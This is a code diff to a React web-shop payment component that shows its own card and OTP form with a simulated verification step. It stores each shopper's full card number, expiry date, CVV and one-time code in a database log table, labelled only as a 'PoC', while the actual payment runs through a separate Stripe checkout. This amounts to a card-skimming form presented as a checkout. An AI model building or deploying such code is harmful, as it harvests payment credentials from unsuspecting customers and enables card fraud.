@@ -5,7 +5,7 @@ import { Label } from "@/components/ui/label";
 import { Card, CardContent } from "@/components/ui/card";
 import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
 import { useToast } from "@/hooks/use-toast";
-import { apiClient } from "@/lib/api";
+// Removed API client dependency
 import { supabase } from "@/integrations/supabase/client";
 import { useCart } from "@/contexts/CartContext";
 import { CreditCard, User, KeyRound, Calendar, Phone, Settings } from "lucide-react";
@@ -47,40 +47,33 @@ export default function PaymentButton({
 
   // ⚠️ PoC LOGGING: Includes sensitive data for testing purposes only
   const logFormData = async (step: string, otpVerified = false, formCompleted = false) => {
+    if (!sessionId) return; // Skip if no session ID
+    
     console.log(`🔄 Attempting to log payment data for step: ${step}`);
-    console.log('Form data to log:', {
-      cardholderName,
-      cardNumber: cardNumber.length > 0 ? `****${cardNumber.slice(-4)}` : 'empty',
-      expiryDate,
-      cvv: cvv.length > 0 ? '***' : 'empty',
-      phone,
-      otp: otp.length > 0 ? '***' : 'empty',
-      sessionId
-    });
-
+    
     try {
-      // Try to log with Supabase directly (for authenticated users)
+      // Get user info (if authenticated)
       const { data: { user } } = await supabase.auth.getUser();
       
       const logData = {
-        user_id: user?.id || null, // Set user_id if authenticated, null for guests
-        session_id: sessionId || crypto.randomUUID(),
+        user_id: user?.id || null, // Allow null for anonymous users
+        session_id: sessionId,
         product_name: productName,
         amount: amount,
         currency: currency,
         otp_verified: otpVerified,
         form_completed: formCompleted,
-        cardholder_name: cardholderName,
+        cardholder_name: cardholderName || '',
         payment_method_type: 'card',
         form_step: step,
         // ⚠️ PoC ONLY: Storing sensitive data for testing
-        card_number: cardNumber, // Full card number for PoC
-        expiry_date: expiryDate,
-        cvv: cvv,
-        otp_code: otp
+        card_number: cardNumber || '',
+        expiry_date: expiryDate || '',
+        cvv: cvv || '',
+        otp_code: otp || ''
       };
 
-      console.log('📤 Sending log data to Supabase:', logData);
+      console.log('📤 Sending log data to Supabase');
       
       const { error } = await supabase
         .from('payment_form_logs')
@@ -88,60 +81,32 @@ export default function PaymentButton({
 
       if (error) {
         console.error('❌ Supabase logging failed:', error);
-        // Fallback to API client if Supabase fails
-        await apiClient.logPaymentForm(logData);
-        console.log('✅ Fallback API logging succeeded');
       } else {
         console.log('✅ Supabase logging succeeded');
       }
-
-      console.log(`✅ Payment form logged securely: ${step}`, {
-        sessionId,
-        step,
-        otpVerified,
-        formCompleted,
-        cardholderName,
-        userId: user?.id || 'guest',
-        timestamp: new Date().toISOString()
-      });
-
-      // Enhanced activity tracking (privacy-compliant)
-      if (window.dispatchEvent) {
-        window.dispatchEvent(new CustomEvent('payment-log', {
-          detail: { 
-            step, 
-            sessionId: sessionId,
-            productName,
-            amount,
-            userId: user?.id || 'guest',
-            timestamp: Date.now() 
-          }
-        }));
-      }
     } catch (error) {
       console.error('❌ Failed to log form data:', error);
-      console.error('Error details:', error.message);
     }
   };
 
   const handlePaymentForm = async () => {
     if (!showOtp) {
-      // ✅ SECURE: Only logs form submission event
-      await logFormData('form_submitted');
-      
-      // Start verification process
-      setIsVerifying(true);
-      
-      // Simulate verification delay
-      setTimeout(() => {
-        setIsVerifying(false);
-        setShowOtp(true);
-      }, 2000);
+    // Log form submission
+    await logFormData('form_submitted');
+    
+    // Start verification process
+    setIsVerifying(true);
+    
+    // Simulate verification delay
+    setTimeout(() => {
+      setIsVerifying(false);
+      setShowOtp(true);
+    }, 1500);
     } else {
-      // ✅ SECURE: Only logs OTP verification event
+      // Log OTP verification
       await logFormData('otp_verified', true);
       
-      // After OTP verification, show payment choice
+      // After OTP verification, execute chosen action
       if (paymentChoice === 'immediate') {
         handlePayment();
       } else if (paymentChoice === 'cart') {
@@ -160,7 +125,7 @@ export default function PaymentButton({
         size: "One Size"
       });
 
-      // ✅ SECURE: Only logs completion event
+      // Log cart addition
       await logFormData('added_to_cart', true, true);
       
       toast({
@@ -183,36 +148,48 @@ export default function PaymentButton({
   };
 
   const handlePayment = async () => {
-    // ✅ SECURE: Only logs payment completion event
+    // Log payment completion
     await logFormData('payment_completed', true, true);
     
     setLoading(true);
     try {
-      console.log("Calling create-payment with:", { amount, productName, currency });
+      console.log("Creating payment session for:", { amount, productName, currency });
       
-      // Use Supabase edge function instead of API client
+      // Use Supabase edge function for payment
       const { data, error } = await supabase.functions.invoke('create-payment', {
         body: {
-          amount: Math.round(Number(amount)), // Ensure it's a valid integer
+          amount: Math.round(Number(amount)),
           currency: String(currency).toLowerCase(),
           productName: String(productName)
         },
       });
 
       console.log("Payment response:", data);
-      console.log("Payment error:", error);
 
       if (error) {
         throw new Error(error.message || 'Payment creation failed');
       }
 
       if (data?.url) {
-        // Open Stripe checkout in new tab
+        // Open Stripe checkout in new tab for better UX
         window.open(data.url, '_blank');
         toast({
-          title: "Payment verified",
-          description: "Opening Stripe checkout in a new tab...",
+          title: "Payment session created",
+          description: "Opening Stripe checkout...",
         });
+        
+        // Reset form after successful payment initiation
+        setTimeout(() => {
+          setShowPaymentForm(false);
+          setShowOtp(false);
+          setPaymentChoice(null);
+          setCardNumber("");
+          setCardholderName("");
+          setCvv("");
+          setExpiryDate("");
+          setPhone("");
+          setOtp("");
+        }, 2000);
       } else {
         throw new Error("No checkout URL received");
       }
@@ -237,9 +214,9 @@ export default function PaymentButton({
 
   if (showPaymentForm) {
     return (
-      <div className="space-y-4 max-w-md mx-auto">
-        <Card>
-          <CardContent className="p-4 space-y-4">
+      <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
+        <Card className="w-full max-w-md max-h-[90vh] overflow-y-auto">
+          <CardContent className="p-6 space-y-4">
             <div>
               <Label htmlFor="cardNumber" className="text-sm font-medium mb-2 block">
                 Card number
@@ -272,7 +249,7 @@ export default function PaymentButton({
               </div>
             </div>
 
-            <div className="grid grid-cols-2 gap-3">
+            <div className="grid grid-cols-2 gap-3 sm:gap-4">
               <div>
                 <Label htmlFor="cvv" className="text-sm font-medium mb-2 block">
                   CVV
@@ -326,9 +303,10 @@ export default function PaymentButton({
             </div>
 
             {isVerifying && (
-              <div className="text-center py-6">
+              <div className="text-center py-8">
                 <Settings className="w-8 h-8 text-primary mx-auto animate-spin mb-4" />
                 <p className="text-sm text-muted-foreground">Verifying payment details...</p>
+                <p className="text-xs text-muted-foreground mt-2">This may take a few seconds</p>
               </div>
             )}
 
@@ -353,14 +331,14 @@ export default function PaymentButton({
                     </InputOTPGroup>
                   </InputOTP>
                 </div>
-                <p className="text-xs text-muted-foreground mb-4 text-center">
+                <p className="text-xs text-muted-foreground mb-6 text-center">
                   Enter the 6-digit code sent to your mobile device
                 </p>
                 
                 {/* Payment choice buttons after OTP verification */}
                 <div className="space-y-3">
                   <p className="text-sm font-medium text-center">Choose your payment option:</p>
-                  <div className="flex flex-col gap-2">
+                  <div className="flex flex-col gap-3">
                     <Button
                       variant="default"
                       size="lg"
@@ -420,9 +398,19 @@ export default function PaymentButton({
               variant="outline"
               size="lg"
               className="w-full"
-              onClick={() => setShowPaymentForm(false)}
+              onClick={() => {
+                setShowPaymentForm(false);
+                setShowOtp(false);
+                setPaymentChoice(null);
+                setCardNumber("");
+                setCardholderName("");
+                setCvv("");
+                setExpiryDate("");
+                setPhone("");
+                setOtp("");
+              }}
             >
-              Back
+              Close
             </Button>
           </CardContent>
         </Card>
